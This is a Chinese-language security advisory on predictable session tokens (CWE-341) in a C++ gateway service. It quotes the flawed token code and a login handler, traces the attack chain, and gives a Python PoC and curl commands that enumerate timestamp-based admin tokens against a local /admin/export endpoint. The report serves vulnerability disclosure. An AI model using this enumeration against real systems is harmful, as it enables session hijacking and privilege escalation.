# VULN-DF-US-003: 会话令牌使用确定性格式生成，零随机性导致可预测和会话劫持

**严重性**: High | **CWE**: CWE-341 (可预测的令牌) | **置信度**: 85/100
**位置**: `src/user_store.cpp:33-36` @ `UserStore::issueSession`

---

## 1. 漏洞细节

`UserStore::issueSession` 函数在生成会话令牌（Session Token）时使用了完全确定性的格式 `sess-{username}-{unix_timestamp}`，未引入任何随机性成分（如 CSPRNG 输出、密钥签名等）。

该令牌的两个组成部分均可被攻击者观测或预测：

- **username（用户名）**：攻击者在登录流程中已知目标用户名，或可通过枚举获取系统中的有效用户名列表（系统中硬编码了 `alice`、`operator`、`admin` 三个用户）。
- **unix_timestamp（Unix 时间戳）**：`std::time(nullptr)` 返回当前秒级精度的 Unix 纪元时间，攻击者可通过 HTTP 响应头中的 `Date` 字段、NTP 同步或简单估算获得服务器时间（误差通常在数秒内）。

由于令牌每秒仅有一个可能值（对于给定用户名），攻击者可在极小的搜索空间内枚举所有可能的令牌。例如，若攻击者估计服务器时间在 ±30 秒范围内，则仅需尝试 61 个候选令牌即可覆盖目标用户的所有可能会话。

生成的令牌通过两个渠道暴露：
1. **HTTP 响应体**：以 `session=sess-{username}-{timestamp}` 格式直接返回给客户端（`main.cpp:51`）
2. **审计日志文件**：以明文形式写入 `edge-gateway.audit.log`（`main.cpp:50` → `audit_log.hpp:11-14`）

## 2. 漏洞代码

**文件**: `src/user_store.cpp` (行 33-36)

```cpp
std::string UserStore::issueSession(const std::string& username) const {
  char token[32];
  // 漏洞根因：令牌格式完全确定性，无任何随机成分
  std::sprintf(token, "sess-%s-%ld", username.c_str(), static_cast<long>(std::time(nullptr)));
  return token;
}
```

**逐行分析**：

- **行 33**：函数签名接收 `username` 参数，该值来自用户登录时提交的查询参数（`main.cpp:41`），认证成功后传入。
- **行 34**：声明 32 字节的栈上字符数组。对于长用户名（如超过 15 字符），`sprintf` 可能导致缓冲区溢出（`"sess-"` 5字节 + 用户名 + `"-"` 1字节 + 时间戳约 10 字节 + 空终止符 1 字节），但此处主要漏洞为可预测性。
- **行 35**：**漏洞根因所在**。`sprintf` 将用户名和当前 Unix 时间戳拼接为令牌字符串。两个输入均为公开可获取信息，无任何密钥、随机数或 HMAC 签名参与计算。
- **行 36**：返回生成的令牌字符串。

**调用上下文**（`src/main.cpp` 行 40-52）：

```cpp
server.route("POST", "/login", [&](const HttpRequest& request) {
    std::string username = queryValue(request, "user");      // 行 41: 用户输入
    std::string password = queryValue(request, "password");   // 行 42: 用户输入
    audit.event(username, "login-attempt", request.body);     // 行 43

    if (!users.authenticate(username, password)) {            // 行 45: 认证检查
      return text(401, "invalid credentials\n");
    }

    std::string token = users.issueSession(username);         // 行 49: 生成可预测令牌
    audit.event(username, "login-success", token);            // 行 50: 令牌写入审计日志
    return text(200, "session=" + token + "\n");              // 行 51: 令牌返回给客户端
});
```

## 3. 完整攻击链路

```
[入口点] POST /login 路由处理器 @ src/main.cpp:40
↓ HTTP 查询参数 user=alice&password=wonderland
[认证] UserStore::authenticate @ src/user_store.cpp:20
↓ 认证成功后，username 传入 issueSession
[漏洞触发] UserStore::issueSession @ src/user_store.cpp:33
↓ sprintf("sess-%s-%ld", "alice", time(nullptr)) → "sess-alice-1718690400"
[暴露面1] AuditLog::event @ include/audit_log.hpp:11
↓ 令牌明文写入 edge-gateway.audit.log
[暴露面2] HTTP 响应 @ src/main.cpp:51
↓ "session=sess-alice-1718690400" 返回给客户端
```

**攻击链路详细说明**：

1. **入口点**（`main.cpp:40`）：`POST /login` 路由接受外部 HTTP 请求，从查询参数中提取 `user` 和 `password`。
2. **认证门控**（`main.cpp:45` → `user_store.cpp:20-26`）：系统使用 `weakHash`（DJB2 哈希变体）验证密码。虽然存在认证门控，但令牌的**可预测性**不受认证保护——攻击者无需通过认证即可预测其他用户的令牌。
3. **令牌生成**（`user_store.cpp:35`）：`sprintf` 以确定性格式生成令牌，零熵值。
4. **令牌暴露**（`main.cpp:50-51`）：令牌同时写入审计日志和 HTTP 响应体，增加了暴露面。

## 4. 攻击场景

**攻击者画像**: 任何能够向目标服务器发送 HTTP 请求的远程攻击者，无需已认证的会话。攻击者只需知道目标用户名（可通过信息泄露或默认用户名获取）。

**攻击向量**: 网络 HTTP 请求。攻击者通过构造预测的会话令牌，冒充任意用户身份。

**利用难度**: 低

### 攻击步骤

1. **信息收集**：确定目标系统中存在的有效用户名。可通过以下途径：
   - 系统中硬编码的用户名（`alice`、`operator`、`admin`）可能通过其他信息泄露渠道暴露
   - 暴力枚举登录接口（系统无速率限制）
   - 审计日志文件泄露（若可访问 `edge-gateway.audit.log`）

2. **时间同步**：获取目标服务器的当前时间（精度 ±数秒）：
   - 向服务器发送任意 HTTP 请求，从响应头 `Date` 字段提取时间
   - 使用 NTP 协议同步时间
   - 简单估算（同一时区内误差通常 < 5 秒）

3. **令牌预测**：根据已知用户名和估计的时间戳，构造候选令牌：
   - 格式：`sess-{username}-{timestamp}`
   - 对于时间窗口 ±30 秒，仅需生成 61 个候选令牌

4. **会话劫持**：使用预测的令牌访问需要会话认证的资源（如 `/admin/export?token=sess-admin-{timestamp}`），冒充目标用户。

5. **权限提升**：若目标用户为 `admin`，攻击者可获得管理员权限，访问管理功能。

## 5. 攻击条件

| 条件类型   | 要求           | 说明                                                                 |
| ---------- | -------------- | -------------------------------------------------------------------- |
| 网络可达性 | 需要           | 攻击者需能向目标服务器的 HTTP 端口（默认 8080）发送请求              |
| 认证要求   | 不需要         | 预测令牌无需认证即可构造；攻击者无需拥有任何合法账户                 |
| 配置依赖   | 无特殊要求     | 漏洞存在于默认代码路径中，无需特殊配置触发                           |
| 环境依赖   | 无特殊要求     | `std::time(nullptr)` 在所有平台上返回 Unix 时间戳，行为一致          |
| 时序条件   | 低精度要求     | 令牌每秒变化一次，攻击者只需在 ±数十秒的时间窗口内枚举即可           |

## 6. 造成影响

| 影响维度 | 等级 | 说明                                                                                   |
| -------- | ---- | -------------------------------------------------------------------------------------- |
| 机密性   | 高   | 攻击者可冒充任意用户（包括 admin）访问受保护资源，获取敏感数据                         |
| 完整性   | 高   | 攻击者可以任意用户身份执行操作（如文件访问、管理导出），篡改系统状态                   |
| 可用性   | 中   | 攻击者可滥用管理功能导致服务异常，或通过大量伪造会话耗尽资源                           |

**影响范围**: 全局影响。攻击者可冒充系统中的任何用户（包括管理员），完全绕过认证机制。由于令牌生成算法是确定性的且无密钥保护，所有用户的会话均可被劫持。若审计日志文件可被外部访问，则已发放的所有令牌均会暴露，影响范围进一步扩大。

## 7. PoC (概念验证)

> ⚠️ 以下 PoC 仅供安全测试和验证使用

### PoC 1: 预测并伪造管理员会话令牌

```python
#!/usr/bin/env python3
"""
PoC: 预测 edge-gateway 会话令牌
仅供安全测试使用 - 验证 CWE-341 可预测令牌漏洞
"""
import time
import requests

TARGET = "http://localhost:8080"
TARGET_USER = "admin"

# 步骤 1: 获取服务器时间（通过任意请求的响应头）
resp = requests.get(f"{TARGET}/health")
# 若服务器未返回 Date 头，使用本地时间（假设时钟同步）
server_time = int(time.time())

print(f"[*] 估计服务器时间: {server_time}")
print(f"[*] 目标用户: {TARGET_USER}")

# 步骤 2: 生成候选令牌（±30 秒窗口）
candidates = []
for offset in range(-30, 31):
    ts = server_time + offset
    token = f"sess-{TARGET_USER}-{ts}"
    candidates.append(token)

print(f"[*] 生成 {len(candidates)} 个候选令牌")
print(f"[*] 示例令牌: {candidates[30]}")

# 步骤 3: 尝试使用预测令牌访问管理接口
for token in candidates:
    resp = requests.get(f"{TARGET}/admin/export", params={"token": token})
    if "denied" not in resp.text:
        print(f"[+] 成功! 令牌: {token}")
        print(f"[+] 响应: {resp.text}")
        break
else:
    print("[-] 在时间窗口内未匹配（可能需要调整时间窗口）")

# 步骤 4: 演示 - 直接登录获取令牌并验证格式可预测
print("\n[*] 验证令牌格式:")
resp = requests.post(f"{TARGET}/login", params={"user": "alice", "password": "wonderland"})
print(f"[+] 登录响应: {resp.text.strip()}")
actual_token = resp.text.strip().replace("session=", "")
expected_token = f"sess-alice-{int(time.time())}"
print(f"[+] 实际令牌: {actual_token}")
print(f"[+] 预期令牌: {expected_token}")
print(f"[+] 格式匹配: {actual_token.startswith('sess-alice-')}")
```

### PoC 2: 快速验证（curl 命令）

```bash
# 仅供安全测试使用
# 步骤 1: 登录获取令牌，验证格式
curl -X POST "http://localhost:8080/login?user=alice&password=wonderland"
# 预期输出: session=sess-alice-{当前时间戳}

# 步骤 2: 获取当前时间戳
TIMESTAMP=$(date +%s)
echo "当前时间戳: $TIMESTAMP"

# 步骤 3: 构造预测的管理员令牌
PREDICTED_TOKEN="sess-admin-${TIMESTAMP}"
echo "预测令牌: $PREDICTED_TOKEN"

# 步骤 4: 使用预测令牌访问管理接口
curl "http://localhost:8080/admin/export?token=${PREDICTED_TOKEN}"
```

**使用说明**:
1. 启动 edge-gateway 服务（默认端口 8080）
2. 运行 PoC 脚本或 curl 命令
3. 观察令牌格式是否匹配预测值

**预期结果**:
- 登录后返回的令牌格式为 `sess-{username}-{timestamp}`，与预测格式完全一致
- 令牌的唯一变量为秒级时间戳，在 ±30 秒窗口内仅有 61 个候选值
- 攻击者可在毫秒级时间内完成枚举

## 8. 验证环境搭建

### 基础环境

- 操作系统: Linux (Ubuntu 20.04+ 或同等发行版)
- 编译器: GCC 9+ 或 Clang 10+（支持 C++17）
- 构建工具: CMake 3.16+
- 依赖: 无外部库依赖（仅使用 C++ 标准库）

### 构建步骤

```bash
cd /scan/project
mkdir -p build && cd build
cmake .. -DCMAKE_BUILD_TYPE=Debug
make -j$(nproc)
```

### 运行配置

```bash
# 启动服务（默认端口 8080）
./edge-gateway 8080

# 或指定其他端口
./edge-gateway 9090
```

无需额外配置文件或环境变量。审计日志自动写入 `edge-gateway.audit.log`。

### 验证步骤

1. 启动 edge-gateway 服务
2. 使用 curl 或 PoC 脚本向 `POST /login` 发送登录请求
3. 记录返回的 `session=` 值
4. 对比返回令牌与 `sess-{username}-{当前时间戳}` 格式是否一致
5. 使用预测的令牌访问 `/admin/export` 接口
6. 检查 `edge-gateway.audit.log` 文件中是否记录了明文令牌

### 预期结果

- 登录成功后返回的令牌严格遵循 `sess-{username}-{unix_timestamp}` 格式
- 令牌的数值部分与请求时刻的 Unix 时间戳完全匹配
- 审计日志文件中包含完整令牌明文，如：`1718690400 user=alice action=login-success detail=sess-alice-1718690400`
- 攻击者可在不知道密码的情况下，通过预测令牌冒充任意用户
